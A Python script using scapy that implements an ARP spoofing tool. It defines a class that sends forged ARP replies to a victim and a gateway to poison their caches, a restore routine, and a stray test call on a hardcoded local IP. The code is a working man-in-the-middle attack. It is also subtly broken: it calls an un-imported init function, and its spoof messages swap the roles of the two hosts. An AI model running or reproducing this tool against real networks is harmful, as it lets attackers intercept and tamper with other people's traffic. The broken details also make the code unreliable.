import scapy.all as scapy
import argparse
from sys import exit

underline='\033[4m'
remove_underline='\033[24m'

color_block='\033[38;5;'
color_45=f'{color_block}45m'
color_51=f'{color_block}51m'
color_160=f'{color_block}160m'
color_122=f'{color_block}122m'
color_123=f'{color_block}123m'
color_124=f'{color_block}124m'
color_251=f'{color_block}251m'
reset_colors='\033[0m'

init(autoreset=True)

class ArpSpoofer:
    def __init__(self,gateway_ip,victim_ip,interface):
        self.interface=interface
        self.victim_ip=victim_ip
        self.gateway_ip=gateway_ip
        self.gateway_mac=self.getmac(gateway_ip)
        self.victim_mac=self.getmac(victim_ip)
         
    def getmac(self,ip):
        request=scapy.ARP(pdst=ip)
        broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet=broadcast/request
        try:
            answer=scapy.srp(final_packet,iface=self.interface,timeout=2,verbose=False)[0]
            return answer[0][1].hwsrc
        except IndexError as e:
            print(f'{color_160}No arp reply was received.{reset_colors}\n{color_122}Try Again? [y/n]:{reset_colors}',end='')
            Ans=input().lower()
            if Ans=="y"or Ans=="yes":
                return self.getmac(ip)
            exit()

    def spoof(self): # Spoof the target 
        packet_for_victim=scapy.ARP(
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.gateway_ip, # Setting the src ip as the  gateway ip.
            op=2 # Its an arp reply so the victim receives it and update its arp cache table.
            )
        packet_for_gateway=scapy.ARP(
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.victim_ip,
            op=2
        )

        scapy.send(packet_for_victim, iface=self.interface, verbose=False)
        # These are just coloring things to make the output more clean and easy to read
        print(f"{color_251}Spoofing {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251} pretending to be {color_124}{underline}{self.victim_ip}{remove_underline}{color_251}...{reset_colors}")
        
        scapy.send(packet_for_gateway,iface=self.interface,verbose=False)
        print(f"{color_251}Spoofing {color_124}{underline}{self.victim_ip}{remove_underline}{color_251} pretending to be {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251}...{reset_colors}")

    def restore(self):
        #Restore each host to its original state
        victim_mac=self.getmac(self.victim_ip)
        gateway_mac=self.getmac(self.gateway_ip)

        # restoring the Gateway
        packet=scapy.ARP(psrc=self.victim_ip,hwsrc=victim_mac,pdst=self.gateway_ip,hwdst=gateway_mac, op=2)
        for i in range(10):
            scapy.send(packet,iface=self.interface,verbose=False)
            print(f'\r{color_45}Restoring {color_51}{self.gateway_ip}{color_45} to its original state.{reset_colors}',flush=True,end='')
        print()
        packet=scapy.ARP(psrc=self.gateway_ip,hwsrc=gateway_mac,pdst=self.victim_ip,hwdst=victim_mac,op=2)
        for i in range(10):
            scapy.send(packet,iface=self.interface,verbose=False)
            print(f'\r{color_45}Restoring {color_51}{self.victim_ip}{color_45} to its original state.{reset_colors}',flush=True,end='')
        print()
        
        return


def getmac(interface,ip):
    request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet=broadcast/request
    try:
        answer=scapy.srp(final_packet,iface=interface,timeout=2,verbose=False)[0]
        return answer[0][1].hwsrc
    except Exception as e:
        print(e)

print(getmac('wlan0','192.168.1.117'))

